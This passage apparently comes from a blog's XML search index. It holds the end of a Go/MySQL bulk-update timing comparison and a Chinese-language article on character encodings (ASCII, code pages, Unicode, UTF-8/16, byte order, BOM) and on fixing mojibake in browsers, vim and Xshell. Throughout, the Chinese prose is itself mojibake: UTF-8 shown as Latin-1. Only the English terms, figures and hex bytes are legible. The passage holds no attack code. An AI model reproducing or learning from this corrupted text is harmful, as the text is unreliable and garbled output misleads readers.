æ€»ç»“æœ€å¯¹4ç§çŠ¶å†µçš„æ’å…¥æ—¶é—´æ’å: Ranking Function Name Time 1 bulkInsertIntoUpdate 462.575115ms 2 bulkReplaceIntoUpdate 564.974107ms 3 bulkStandardUpdate 3.160858907s 4 withTxUpdate 3.998437161s ç»“è®ºå¾ˆæ˜æ˜¾: InsertIntoæ›´æ–°æ•ˆç‡é«˜å¾ˆå¤š]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç¼–ç çŸ¥è¯†ä¸å¸¸è§ä¹±ç é—®é¢˜çš„è§£å†³åŠæ³•]]></title>
    <url>%2F2017%2F05%2F14%2Funicode-war%2F</url>
    <content type="text"><![CDATA[æœ‰ä¸€ä¸ªå³ä½¿åœ¨ç»éªŒä¸°å¯Œçš„ç¨‹åºå‘˜ä¸­ä¹Ÿéå¸¸å¸¸è§çš„è¯¯è§£å°±æ˜¯ï¼Œçº¯æ–‡æœ¬ä½¿ç”¨ASCIIç å¹¶ä¸”æ¯ä¸ªå­—ç¬¦éƒ½æ˜¯8bitsã€‚äº‹å®ä¸Šå¹¶ä¸å­˜åœ¨è¿™æ ·çš„çº¯æ–‡æœ¬ ï¼Œå¦‚æœåœ¨å†…å­˜æˆ–è€…æ˜¯ç¡¬ç›˜ä¸Šé¢æœ‰ä¸€ä¸ªä½ ä¸çŸ¥é“ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä½ å°†æ— æ³•ç¿»è¯‘æˆ–è€…æ˜¾ç¤ºå®ƒ ï¼Œè¿™ç»å¯¹æ²¡æœ‰ç¬¬äºŒæ¡è·¯å¯é€‰ã€‚ æ•°æ®çš„æœ¬è´¨: äºŒè¿›åˆ¶CPUèƒ½è¯†åˆ«çš„æ•°æ®: CPUæ˜¯åˆ©ç”¨æ•°å­—ç”µè·¯è®¾è®¡å‡ºæ¥çš„,æ‰€ä»¥ä»…èƒ½è¯†åˆ«äºŒè¿›åˆ¶çš„æ•°æ®ã€‚ç£ç›˜èƒ½è¯†åˆ«çš„æ•°æ®ï¼š ç£ç›˜ä¸Šæœ‰å¾ˆå¤šç£æ€§çš„ç‚¹ï¼Œè€Œè¿™äº›ç‚¹ æœ‰2ç§çŠ¶æ€ï¼Œæ‰€ä»¥ä»»ä½•æ•°æ® ä»…èƒ½è½¬æ¢æˆ2è¿›ç¨‹ ï¼ŒåŠ01 ä»£ç  æ‰èƒ½åˆ©ç”¨ç£ç›˜çš„ç‚¹çš„è¿™ç§ç‰¹æ€§ æ¥è¿›è¡Œå­˜å‚¨ ï¼Œæ‰€ä»¥ä»»ä½•å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„æ•°æ® éƒ½æ˜¯äºŒè¿›åˆ¶ç½‘ç»œä¼ è¾“çš„æ•°æ®ï¼šé€šè¿‡ç½‘ç»œè¾“å‡ºè¿‡æ¥çš„æ•°æ®ï¼Œä¸ºé«˜ä½ç”µé¢‘ï¼Œä¹Ÿå¯¹åº”äºŒè¿›åˆ¶ ä½†æ˜¯ä¸ºå•¥æˆ‘ä»¬çœ‹åˆ°çš„æ•°æ®éƒ½ä¸æ˜¯01ä»£ç å–ƒ, æ¯”å¦‚æ•°æ®ï¼š ä¸€ä¸²äºŒè¿›åˆ¶çš„bitsï¼š0100100001000101010011000100110001001111 ä¸ºå•¥æœ€åæˆ‘ä»¬ç”¨æ–‡æœ¬å·¥å…·æ‰“å¼€å, çœ‹åˆ°çš„æ˜¯HELLOè€Œä¸æ˜¯01ä»£ç æœ¬èº«å–ƒï¼Ÿé‚£æ–‡æœ¬ç¼–è¾‘å™¨æ˜¯æ€ä¹ˆå°†äºŒè¿›åˆ¶ç¿»è¯‘æˆå­—ç¬¦çš„å–ƒï¼Ÿè¿™é‡Œæœ‰2ä¸ªå…³é”®çš„é—®é¢˜: å­—èŠ‚æ˜¯æ€æ ·åˆ†ç»„çš„ï¼Ÿï¼ˆä¾‹å¦‚1ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦è¿˜æ˜¯2ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼‰ ä¸€ä¸ªæˆ–å¤šä¸ªå­—èŠ‚æ˜¯æ€ä¹ˆæ˜ å°„åˆ°å­—ç¬¦ä¸Šçš„? è¿™å°±æ˜¯æˆ‘ä»¬è¦è¯´çš„ç¼–ç éœ€è¦è§£å†³çš„é—®é¢˜ã€‚ ç¼–ç æ¦‚å¿µç¼–ç çš„æ ¸å¿ƒæ˜¯å®šä¹‰äº†å¦‚ä¸‹2ä»¶äº‹æƒ…: å­—èŠ‚æ˜¯æ€ä¹ˆåˆ†ç»„çš„ï¼Œå¦‚8 bitsæˆ–16 bitsä¸€ç»„ï¼Œè¿™ä¹Ÿè¢«ç§°ä½œç¼–ç å•å…ƒã€‚ ç¼–ç å•å…ƒå’Œå­—ç¬¦ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚ä¾‹å¦‚ï¼Œåœ¨ASCIIç ä¸­ï¼Œåè¿›åˆ¶65æ˜ å°„åˆ°å­—æ¯Aä¸Š ç¼–ç ä¹‹æˆ˜æ··æˆ˜å¹´ä»£å¾ˆä¹…ä»¥å‰ï¼Œè®¡ç®—æœºåˆ¶é€ å•†æœ‰è‡ªå·±çš„è¡¨ç¤ºå­—ç¬¦çš„æ–¹å¼ã€‚ä»–ä»¬å¹¶ä¸éœ€è¦æ‹…å¿ƒå¦‚ä½•å’Œå…¶å®ƒè®¡ç®—æœºäº¤æµï¼Œå¹¶æå‡ºäº†å„è‡ªçš„æ–¹å¼æ¥å°†å­—å½¢æ¸²æŸ“åˆ°å±å¹•ä¸Šã€‚éšç€è®¡ç®—æœºè¶Šæ¥è¶Šæµè¡Œï¼Œå‚å•†ä¹‹é—´çš„ç«äº‰æ›´åŠ æ¿€çƒˆï¼Œåœ¨ä¸åŒçš„è®¡ç®—æœºä½“ç³»é—´è½¬æ¢æ•°æ®å˜å¾—ååˆ†è›‹ç–¼ï¼Œäººä»¬åŒçƒ¦äº†è¿™ç§è‡ªå®šä¹‰é€ æˆçš„æ··ä¹±ã€‚ ASCIIç çš„åˆ°æ¥æœ€ç»ˆï¼Œè®¡ç®—æœºåˆ¶é€ å•†ä¸€èµ·åˆ¶å®šäº†ä¸€ä¸ªæ ‡å‡†çš„æ–¹æ³•æ¥æè¿°å­—ç¬¦ã€‚ä»–ä»¬å®šä¹‰ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚çš„ä½7ä½æ¥è¡¨ç¤ºå­—ç¬¦ï¼Œå¹¶ä¸”åˆ¶ä½œäº†å¦‚ä¸Šå›¾æ‰€ç¤ºçš„å¯¹ç…§è¡¨æ¥æ˜ å°„ä¸ƒä¸ªæ¯”ç‰¹çš„å€¼åˆ°ä¸€ä¸ªå­—ç¬¦ä¸Šã€‚ä¾‹å¦‚ï¼Œå­—æ¯Aæ˜¯65ï¼Œcæ˜¯99ï¼Œ~æ˜¯126ç­‰ç­‰ï¼Œ ASCIIç å°±è¿™æ ·è¯ç”Ÿäº†ã€‚åŸå§‹çš„ASCIIæ ‡å‡†å®šä¹‰äº†ä»0åˆ°127 çš„å­—ç¬¦ï¼Œè¿™æ ·æ­£å¥½èƒ½ç”¨ä¸ƒä¸ªæ¯”ç‰¹è¡¨ç¤ºã€‚ä¸è¿‡å¥½æ™¯ä¸é•¿ã€‚ã€‚ã€‚ ASCIIç ç¬¬å…«ä½ å¼•èµ·çš„æˆ˜äº‰ä¸ºä»€ä¹ˆé€‰æ‹©äº†7ä¸ªæ¯”ç‰¹è€Œä¸æ˜¯8ä¸ªæ¥è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦å‘¢ï¼Ÿæˆ‘å¹¶ä¸å…³å¿ƒã€‚ä½†æ˜¯ä¸€ä¸ªå­—èŠ‚æ˜¯8ä¸ªæ¯”ç‰¹ï¼Œè¿™æ„å‘³ç€1ä¸ªæ¯”ç‰¹å¹¶æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯ä»128åˆ°255çš„ç¼–ç å¹¶æ²¡æœ‰è¢«åˆ¶å®šASCIIæ ‡å‡†çš„äººæ‰€è§„å®šï¼Œè¿™äº›ç¾å›½äººå¯¹ä¸–ç•Œçš„å…¶å®ƒåœ°æ–¹ä¸€æ— æ‰€çŸ¥ç”šè‡³å®Œå…¨ä¸å…³å¿ƒã€‚å…¶å®ƒå›½å®¶çš„äººè¶è¿™ä¸ªæœºä¼šå¼€å§‹ä½¿ç”¨128åˆ°255èŒƒå›´å†…çš„ç¼–ç æ¥è¡¨è¾¾è‡ªå·±è¯­è¨€ä¸­çš„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ144åœ¨é˜¿æ‹‰ä¼¯äººçš„ASCIIç ä¸­æ˜¯Ú¯ï¼Œè€Œåœ¨ä¿„ç½—æ–¯çš„ASCIIç ä¸­æ˜¯Ñ’ã€‚å³ä½¿åœ¨ç¾å›½ï¼Œå¯¹äºæœªä½¿ç”¨åŒºåŸŸä¹Ÿæœ‰å„ç§å„æ ·çš„åˆ©ç”¨ã€‚IBM PCå°±å‡ºç°äº†â€œOEM å­—ä½“â€æˆ–â€æ‰©å±•ASCIIç â€ï¼Œä¸ºç”¨æˆ·æä¾›æ¼‚äº®çš„å›¾å½¢æ–‡å­—æ¥ç»˜åˆ¶æ–‡æœ¬æ¡†å¹¶æ”¯æŒä¸€äº›æ¬§æ´²å­—ç¬¦ï¼Œä¾‹å¦‚è‹±é•‘ï¼ˆÂ£ï¼‰ç¬¦å·ã€‚å†å¼ºè°ƒä¸€éï¼ŒASCIIç çš„é—®é¢˜åœ¨äºå°½ç®¡æ‰€æœ‰äººéƒ½åœ¨0-127å·å­—ç¬¦çš„ä½¿ç”¨ä¸Šè¾¾æˆäº†ä¸€è‡´ï¼Œä½†å¯¹äº128-255å·å­—ç¬¦å´æœ‰å¾ˆå¤šå¾ˆå¤šä¸åŒçš„è§£é‡Šã€‚ä½ å¿…é¡»å‘Šè¯‰è®¡ç®—æœºä½¿ç”¨å“ªç§é£æ ¼çš„ASCIIç æ‰èƒ½æ­£ç¡®æ˜¾ç¤º128-255å·çš„å­—ç¬¦ã€‚è¿™å¯¹äºåŒ—ç¾äººå’Œä¸åˆ—é¢ ç¾¤å²›çš„äººæ¥è¯´ä¸ç®—ä»€ä¹ˆé—®é¢˜ï¼Œå› ä¸ºæ— è®ºä½¿ç”¨å“ªç§é£æ ¼çš„ASCIIç ï¼Œæ‹‰ä¸å­—æ¯çš„æ˜¾ç¤ºéƒ½æ˜¯ä¸€æ ·çš„ã€‚è‹±å›½äººè¿˜éœ€è¦é¢å¯¹çš„é—®é¢˜æ˜¯åŸå§‹çš„ASCIIç ä¸­ä¸åŒ…å«è‹±é•‘ç¬¦å·ï¼Œä½†æ˜¯è¿™ä¸ªå·²ç»æ— å…³ç´§è¦äº†ã€‚ä¸æ­¤åŒæ—¶ï¼Œåœ¨äºšæ´²æœ‰æ›´è®©äººå¤´ç–¼çš„é—®é¢˜ã€‚äºšæ´²è¯­è¨€æœ‰æ›´å¤šçš„å­—ç¬¦å’Œå­—å½¢éœ€è¦è¢«å­˜å‚¨ï¼Œä¸€ä¸ªå­—èŠ‚å·²ç»ä¸å¤Ÿç”¨äº†ã€‚æ‰€ä»¥ä»–ä»¬å¼€å§‹ä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚æ¥å­˜å‚¨å­—ç¬¦ï¼Œè¿™è¢«ç§°ä½œDBCSï¼ˆåŒå­—èŠ‚ç¼–ç æ–¹æ¡ˆï¼‰ã€‚åœ¨DBCSä¸­ï¼Œå­—ç¬¦ä¸²æ“ä½œå˜å¾—å¾ˆè›‹ç–¼ï¼Œä½ åº”è¯¥æ€ä¹ˆåšstr++æˆ–strâ€“ï¼Ÿè¿™äº›é—®é¢˜æˆä¸ºäº†ç³»ç»Ÿå¼€å‘è€…çš„å™©æ¢¦ã€‚ä¾‹å¦‚ï¼ŒMS DOSå¿…é¡»æ”¯æŒæ‰€æœ‰é£æ ¼çš„ASCIIç ï¼Œå› ä¸ºä»–ä»¬æƒ³æŠŠè½¯ä»¶å–åˆ°å…¶ä»–å›½å®¶å»ã€‚ä»–ä»¬æå‡ºäº†ã€Œå†…ç è¡¨ã€è¿™ä¸€æ¦‚å¿µã€‚ä¾‹å¦‚ï¼Œä½ éœ€è¦å‘Šè¯‰DOSï¼ˆé€šè¿‡ä½¿ç”¨â€chcpâ€å‘½ä»¤ï¼‰ä½ æƒ³ä½¿ç”¨ä¿åŠ åˆ©äºšè¯­çš„å†…ç è¡¨ï¼Œå®ƒæ‰èƒ½æ˜¾ç¤ºä¿åŠ åˆ©äºšå­—æ¯ã€‚å†…ç è¡¨çš„æ›´æ¢ä¼šåº”ç”¨åˆ°æ•´ä¸ªç³»ç»Ÿã€‚è¿™å¯¹ä½¿ç”¨å¤šç§è¯­è¨€å·¥ä½œçš„äººæ¥è¯´æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºä»–ä»¬å¿…é¡»é¢‘ç¹çš„åœ¨å‡ ä¸ªå†…ç è¡¨ä¹‹é—´æ¥å›åˆ‡æ¢ã€‚å°½ç®¡å†…ç è¡¨æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼Œä½†æ˜¯å®ƒä¸æ˜¯ä¸€ä¸ªç®€æ´çš„è§£å†³æ–¹æ¡ˆï¼Œå®ƒåªæ˜¯ä¸€ä¸ªhackæŠ€æœ¯æˆ–è€…è¯´æ˜¯ç®€å•çš„ä¿®æ­£æ¥è®©ç¼–ç ç³»ç»Ÿå¯ä»¥å·¥ä½œã€‚ Unicodeçš„ä¸–ç•Œæœ€ç»ˆï¼Œç¾å›½äººæ„è¯†åˆ°ä»–ä»¬åº”è¯¥æå‡ºä¸€ç§æ ‡å‡†æ–¹æ¡ˆæ¥å±•ç¤ºä¸–ç•Œä¸Šæ‰€æœ‰è¯­è¨€ä¸­çš„æ‰€æœ‰å­—ç¬¦ï¼Œä»¥ä¾¿ç¼“è§£ç¨‹åºå‘˜çš„ç—›è‹¦å’Œé¿å…å­—ç¬¦ç¼–ç å¼•å‘çš„ç¬¬ä¸‰æ¬¡ä¸–ç•Œå¤§æˆ˜ã€‚å‡ºäºè¿™ä¸ªç›®çš„ï¼ŒUnicodeè¯ç”Ÿäº†ã€‚UnicodeèƒŒåçš„æƒ³æ³•éå¸¸ç®€å•ï¼Œç„¶è€Œå´è¢«æ™®éçš„è¯¯è§£äº†ã€‚Unicodeå°±åƒä¸€ä¸ªç”µè¯æœ¬ï¼Œæ ‡è®°ç€å­—ç¬¦å’Œæ•°å­—ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚Joelç§°ä¹‹ä¸ºã€Œç¥å¥‡æ•°å­—ã€ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½æ˜¯éšæœºæŒ‡å®šçš„ï¼Œè€Œä¸”ä¸ä¼šç»™å‡ºä»»ä½•è§£é‡Šã€‚å®˜æ–¹æœ¯è¯­æ˜¯ç ä½(Code Point)ï¼Œæ€»æ˜¯ç”¨U+å¼€å¤´ã€‚ç†è®ºä¸Šæ¯ç§è¯­è¨€ä¸­çš„æ¯ç§å­—ç¬¦éƒ½è¢«Unicodeåä¼šæŒ‡å®šäº†ä¸€ä¸ªç¥å¥‡æ•°å­—ã€‚ä¾‹å¦‚å¸Œä¼¯æ¥æ–‡ä¸­çš„ç¬¬ä¸€ä¸ªå­—æ¯×ï¼Œæ˜¯U+2135ï¼Œå­—æ¯Aæ˜¯U+0061ã€‚Unicodeå¹¶ä¸æ¶‰åŠå­—ç¬¦æ˜¯æ€ä¹ˆåœ¨å­—èŠ‚ä¸­è¡¨ç¤ºçš„ï¼Œå®ƒä»…ä»…æŒ‡å®šäº†å­—ç¬¦å¯¹åº”çš„æ•°å­—ï¼Œä»…æ­¤è€Œå·²ã€‚å…³äºUnicodeçš„å…¶å®ƒè¯¯è§£åŒ…æ‹¬ï¼šUnicodeæ”¯æŒçš„å­—ç¬¦ä¸Šé™æ˜¯65536ä¸ªï¼ŒUnicodeå­—ç¬¦å¿…é¡»å ä¸¤ä¸ªå­—èŠ‚ã€‚å‘Šè¯‰ä½ è¿™äº›çš„äººåº”è¯¥å»æ¢æ¢è„‘å­äº†ã€‚è®°ä½ï¼ŒUnicodeåªæ˜¯ä¸€ä¸ªç”¨æ¥æ˜ å°„å­—ç¬¦å’Œæ•°å­—çš„æ ‡å‡†ã€‚å®ƒå¯¹æ”¯æŒå­—ç¬¦çš„æ•°é‡æ²¡æœ‰é™åˆ¶ï¼Œä¹Ÿä¸è¦æ±‚å­—ç¬¦å¿…é¡»å ä¸¤ä¸ªã€ä¸‰ä¸ªæˆ–è€…å…¶å®ƒä»»æ„æ•°é‡çš„å­—èŠ‚ã€‚Unicodeå­—ç¬¦æ˜¯æ€æ ·è¢«ç¼–ç æˆå†…å­˜ä¸­çš„å­—èŠ‚è¿™æ˜¯å¦å¤–çš„è¯é¢˜ï¼Œå®ƒæ˜¯è¢«UTF(Unicode Transformation Formats)å®šä¹‰çš„ã€‚ Unicodeçš„å®ç°ä¸¤ä¸ªæœ€æµè¡Œçš„Unicodeç¼–ç æ–¹æ¡ˆæ˜¯UTF-8å’ŒUTF-16ã€‚è®©æˆ‘ä»¬çœ‹çœ‹å®ƒä»¬çš„ç»†èŠ‚UTF-8æ˜¯ä¸€ä¸ªéå¸¸æƒŠè‰³çš„æ¦‚å¿µï¼Œå®ƒæ¼‚äº®çš„å®ç°äº†å¯¹ASCIIç çš„å‘åå…¼å®¹ï¼Œä»¥ä¿è¯Unicodeå¯ä»¥è¢«å¤§ä¼—æ¥å—ã€‚å‘æ˜å®ƒçš„äººè‡³å°‘åº”è¯¥å¾—ä¸ªè¯ºè´å°”å’Œå¹³å¥–ã€‚åœ¨UTF-8ä¸­ï¼Œ0-127å·çš„å­—ç¬¦ç”¨1ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œä½¿ç”¨å’ŒUS-ASCIIç›¸åŒçš„ç¼–ç ã€‚è¿™æ„å‘³ç€1980å¹´ä»£å†™çš„æ–‡æ¡£ç”¨UTF-8æ‰“å¼€ä¸€ç‚¹é—®é¢˜éƒ½æ²¡æœ‰ã€‚åªæœ‰128å·åŠä»¥ä¸Šçš„å­—ç¬¦æ‰ç”¨2ä¸ªï¼Œ3ä¸ªæˆ–è€…4ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºã€‚å› æ­¤ï¼ŒUTF-8è¢«ç§°ä½œå¯å˜é•¿åº¦ç¼–ç ã€‚0100100001000101010011000100110001001111è¿™ä¸ªå­—èŠ‚æµåœ¨ASCIIå’ŒUTF-8ä¸­è¡¨ç¤ºç›¸åŒçš„å­—ç¬¦ï¼šHELLOå¦ä¸€ä¸ªæµè¡Œçš„å¯å˜é•¿åº¦ç¼–ç æ–¹æ¡ˆæ˜¯UTF-16ï¼Œå®ƒä½¿ç”¨2ä¸ªæˆ–è€…4ä¸ªå­—èŠ‚æ¥å­˜å‚¨å­—ç¬¦ã€‚ç„¶è€Œï¼Œäººä»¬é€æ¸æ„è¯†åˆ°UTF-16å¯èƒ½ä¼šæµªè´¹å­˜å‚¨ç©ºé—´ï¼Œä½†é‚£æ˜¯å¦ä¸€ä¸ªè¯é¢˜äº†ã€‚ ç¼–ç æ’åºä½å­—èŠ‚åº(Little Endian)å’Œé«˜å­—èŠ‚åº(Big Endian)Endianè¯»ä½œEnd-ianæˆ–è€…Indianã€‚è¿™ä¸ªæœ¯è¯­çš„èµ·æºå¯ä»¥è¿½æº¯åˆ°æ ¼åˆ—ä½›æ¸¸è®°ã€‚ï¼ˆå°è¯´ä¸­ï¼Œå°äººå›½ä¸ºæ°´ç…®è›‹åº”è¯¥ä»å¤§çš„ä¸€ç«¯ï¼ˆBig-Endï¼‰å‰¥å¼€è¿˜æ˜¯å°çš„ä¸€ç«¯ï¼ˆLittle-Endï¼‰å‰¥å¼€è€Œäº‰è®ºï¼Œäº‰è®ºçš„åŒæ–¹åˆ†åˆ«è¢«ç§°ä¸ºâ€œå¤§ç«¯æ´¾â€å’Œâ€œå°ç«¯æ´¾â€ã€‚ï¼‰ä½å­—èŠ‚åºå’Œé«˜å­—èŠ‚åºåªæ˜¯ä¸€ä¸ªå…³äºåœ¨å†…å­˜ä¸­å­˜å‚¨å’Œè¯»å–ä¸€æ®µå­—èŠ‚ï¼ˆè¢«ç§°ä½œwordsï¼‰çš„çº¦å®šã€‚è¿™æ„å‘³ç€å½“ä½ è®©è®¡ç®—æœºç”¨UTF-16æŠŠå­—æ¯Aï¼ˆå ä¸¤ä¸ªå­—èŠ‚ï¼‰å­˜åœ¨å†…å­˜ä¸­æ—¶ï¼Œä½¿ç”¨å“ªç§å­—èŠ‚åºæ–¹æ¡ˆå†³å®šäº†ä½ æŠŠç¬¬ä¸€ä¸ªå­—èŠ‚æ”¾åœ¨ç¬¬äºŒä¸ªå­—èŠ‚çš„å‰é¢è¿˜æ˜¯åé¢ã€‚è¿™ä¹ˆè¯´æœ‰ç‚¹ä¸å¤ªå®¹æ˜“æ‡‚ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼šå½“ä½ ä½¿ç”¨UTF-16å­˜ä¸‹æ¥è‡ªä½ æœ‹å‹çš„é™„ä»¶æ—¶ï¼Œåœ¨ä¸åŒçš„ç³»ç»Ÿä¸­å®ƒçš„ååŠéƒ¨åˆ†å¯èƒ½æ˜¯è¿™æ ·çš„ï¼š00 68 00 65 00 6C 00 6C 00 6Fï¼ˆé«˜å­—èŠ‚åºï¼Œé«˜ä½å­—èŠ‚è¢«å­˜åœ¨å‰é¢ï¼‰68 00 65 00 6C 00 6C 00 6F 00ï¼ˆä½å­—èŠ‚åºï¼Œä½ä½å­—èŠ‚è¢«å­˜åœ¨å‰é¢ï¼‰å­—èŠ‚åºæ–¹æ¡ˆåªæ˜¯ä¸€ä¸ªå¾®å¤„ç†å™¨æ¶æ„è®¾è®¡è€…çš„åå¥½é—®é¢˜ï¼Œä¾‹å¦‚ï¼ŒIntelä½¿ç”¨ä½å­—èŠ‚åºï¼ŒMotorolaä½¿ç”¨é«˜å­—èŠ‚åºã€‚ å­—èŠ‚é¡ºåºæ ‡è®°å¦‚æœä½ ç»å¸¸è¦åœ¨é«˜ä½å­—èŠ‚åºçš„ç³»ç»Ÿé—´è½¬æ¢æ–‡æ¡£ï¼Œå¹¶ä¸”å¸Œæœ›åŒºåˆ†å­—èŠ‚åºï¼Œè¿˜æœ‰ä¸€ç§å¥‡æ€ªçš„çº¦å®šï¼Œè¢«ç§°ä½œBOMã€‚BOMæ˜¯ä¸€ä¸ªè®¾è®¡å¾—å¾ˆå·§å¦™çš„å­—ç¬¦ï¼Œç”¨æ¥æ”¾åœ¨æ–‡æ¡£çš„å¼€å¤´å‘Šè¯‰é˜…è¯»å™¨è¯¥æ–‡æ¡£çš„å­—èŠ‚åºã€‚åœ¨UTF-16ä¸­ï¼Œå®ƒæ˜¯é€šè¿‡åœ¨ç¬¬ä¸€ä¸ªå­—èŠ‚æ”¾ç½®FE FFæ¥å®ç°çš„ã€‚åœ¨ä¸åŒå­—èŠ‚åºçš„æ–‡æ¡£ä¸­ï¼Œå®ƒä¼šè¢«æ˜¾ç¤ºæˆFF FEæˆ–è€…FE FFï¼Œæ¸…æ¥šçš„æŠŠè¿™ç¯‡æ–‡æ¡£çš„å­—èŠ‚åºå‘Šè¯‰äº†è§£é‡Šå™¨ã€‚ BOMå°½ç®¡å¾ˆæœ‰ç”¨ï¼Œä½†å¹¶ä¸æ˜¯å¾ˆç®€æ´ï¼Œå› ä¸ºè¿˜æœ‰ä¸€ä¸ªç±»ä¼¼çš„æ¦‚å¿µï¼Œç§°ä½œã€Œé­”æœ¯å­—ã€(Magic Byte)ï¼Œå¾ˆå¤šå¹´æ¥ä¸€ç›´è¢«ç”¨æ¥è¡¨æ˜æ–‡ä»¶çš„æ ¼å¼ã€‚BOMå’Œé­”æœ¯å­—é—´çš„å…³ç³»ä¸€ç›´æ²¡æœ‰è¢«æ¸…æ¥šçš„å®šä¹‰è¿‡ï¼Œå› æ­¤æœ‰çš„è§£é‡Šå™¨ä¼šææ··å®ƒä»¬ã€‚ å¸¸è§çš„ç¼–ç å¼•èµ·çš„é—®é¢˜æˆ‘ä»¬çœ‹åˆ°çš„ä»»ä½•è¾“å‡ºï¼Œéƒ½æ˜¯ç¨‹åºå±•ç¤ºæˆ‘ä»¬çš„ï¼Œç¨‹åºæ ¹æ®ç¼–ç æ¥è¿›è¡Œè¿™ä¸ªæ˜ å°„å…³ç³»çš„è½¬æ¢ï¼Œå¦‚æœç¨‹åºæŠŠè¿™ç¼–ç æé”™äº†ï¼Œå°±ä¼šå‡ºç°ä¹±ç é—®é¢˜å½“è½¯ä»¶ä¸èƒ½ç¡®å®šç¼–ç çš„æ—¶å€™ï¼Œå®ƒä¼šçŒœæµ‹ã€‚å¤§éƒ¨åˆ†æ—¶å€™ï¼Œå®ƒä¼šçŒœæµ‹æ˜¯å¦æ˜¯æ¶µç›–äº†ASCIIç çš„UTF-8ï¼Œè¿˜æ˜¯ISO-8859-1ï¼Œä¹Ÿæœ‰å¯èƒ½çŒœå…¶ä»–èƒ½æƒ³åˆ°çš„ä»»æ„å­—ç¬¦é›†ã€‚å› ä¸ºè‹±æ–‡ä¸­ä½¿ç”¨çš„æ‹‰ä¸å­—æ¯è¡¨åœ¨å‡ ä¹æ‰€æœ‰çš„å­—ç¬¦é›†ä¸­éƒ½èƒ½æ˜¾ç¤ºï¼ŒåŒ…æ‹¬UTF-8ï¼Œæ‰€ä»¥å³ä½¿ç¼–ç çŒœé”™äº†ï¼Œè‹±æ–‡å­—æ¯çœ‹èµ·æ¥ä¹Ÿæ˜¯æ­£ç¡®çš„ã€‚ æµè§ˆå™¨ä¹±ç é—®é¢˜å¦‚æœä½ åœ¨æµè§ˆç½‘é¡µæ—¶çœ‹åˆ°ï¿½ç¬¦å·ï¼Œè¿™æ„å‘³ç€è¿™ä¸ªç½‘é¡µçš„ç¼–ç ä¸æ˜¯ä½ çš„æµè§ˆå™¨çŒœæµ‹çš„é‚£ä¸ªã€‚è¿™æ—¶ä½ å¯ä»¥ç‚¹å¼€æµè§ˆå™¨çš„æŸ¥çœ‹-&gt;å­—ç¬¦ç¼–ç èœå•æ¥å°è¯•ä¸åŒçš„ç¼–ç ã€‚ å¯¹äºç¨‹åºå¼€å‘è€…æ¥è¯´ï¼Œå› é¿å…è®©æµè§ˆå™¨ çŒœæµ‹æ–‡æ¡£çš„ç¼–ç ï¼Œå› æ­¤ï¼š æ°¸è¿œè®°å¾—é€šè¿‡Content-Typeæˆ–è€…meta charsetæ ‡ç­¾æ¥æ˜¾å¼æŒ‡å®šä½ çš„æ–‡æ¡£çš„ç¼–ç ã€‚è¿™æ ·æµè§ˆå™¨å°±ä¸éœ€è¦çŒœæµ‹ä½ ä½¿ç”¨çš„ç¼–ç äº†ï¼Œä»–ä»¬ä¼šå‡†ç¡®çš„ä½¿ç”¨ä½ æŒ‡å®šçš„ç¼–ç æ¥æ¸²æŸ“æ–‡æ¡£ã€‚ ç¼–è¾‘å™¨ä¹±ç é—®é¢˜ä¾‹å¦‚ æˆ‘ç”¨ vim æ‰“å¼€ä¸€ä¸ª utf8 ç¼–ç çš„æ–‡ä»¶ï¼šé€šè¿‡è¾“å…¥ set encoding ï¼Œä¼šå‘ç°æ­¤æ—¶ç¼–è¾‘å™¨ ä½¿ç”¨çš„ç¼–ç æ˜¯ latin1é€šè¿‡ set encoding=utf8 ï¼ŒæŠŠç¼–ç è½¬æ¢è¿‡æ¥å¦‚æœæƒ³è¿™ä¸ªé…ç½®æ°¸ä¹…ç”Ÿæ•ˆ ï¼Œè¯·å†™å…¥vim çš„é…ç½®æ–‡ä»¶å§ Xshell è™šæ‹Ÿç»ˆç«¯ä¹±ç é—®é¢˜æˆ‘åœ¨xshellç»ˆç«¯ä¸‹ tail ä¸€ä¸ªutf8 ç¼–ç çš„æ–‡ä»¶ï¼Œè¿™ä¸ªå‘½ä»¤å–å¾—çš„ç»“æœä¼šé€åˆ° Xshell ç»ˆç«¯ ï¼Œç„¶åæœ‰Xshell ç»ˆç«¯è¿›è¡Œè§£ç ï¼Œå±•ç¤ºåœ¨æˆ‘ä»¬é¢å‰åŸæœ¬çš„æ•°æ® æ˜¯utf8ç¼–ç çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ç»ˆç«¯ å´é€‰ç”¨Arabic æ¥è¿›è¡Œè§£ç ï¼Œæ‰€ä»¥ä¹±ç ç°åœ¨æˆ‘ä»¬å°†Xshell çš„ç¼–ç æ¢æˆ utf8 æ€»ç»“ç¼–ç è¡¨ å°±æ˜¯ä¸€å¼ æ˜ å°„è¡¨ï¼Œä¸åŒçš„ç¼–ç æœ‰è‡ªå·±çš„æ˜ å°„è§„åˆ™12æ•°æ® â€”â€”â€“&gt; äºŒè¿›åˆ¶ ï¼ˆè½¯ä»¶æ¥ç¼–ç ï¼‰äºŒè¿›åˆ¶ â€”â€”â€“&gt; æ•°æ® ï¼ˆè½¯ä»¶æ¥è§£ç ï¼‰ å¦‚æœç¼–ç å’Œè§£ç ä¸æ˜¯åŒä¸€ç§ç¼–ç ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°ä¹±ç ï¼Œè¿™ä¸ªåŠ å¯†è§£ç ä¸€ä¸ªé“ç†]]></content>
